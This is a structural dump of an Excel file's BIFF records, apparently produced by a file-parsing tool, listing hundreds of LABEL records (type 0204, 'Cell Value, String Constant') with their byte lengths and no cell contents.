' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
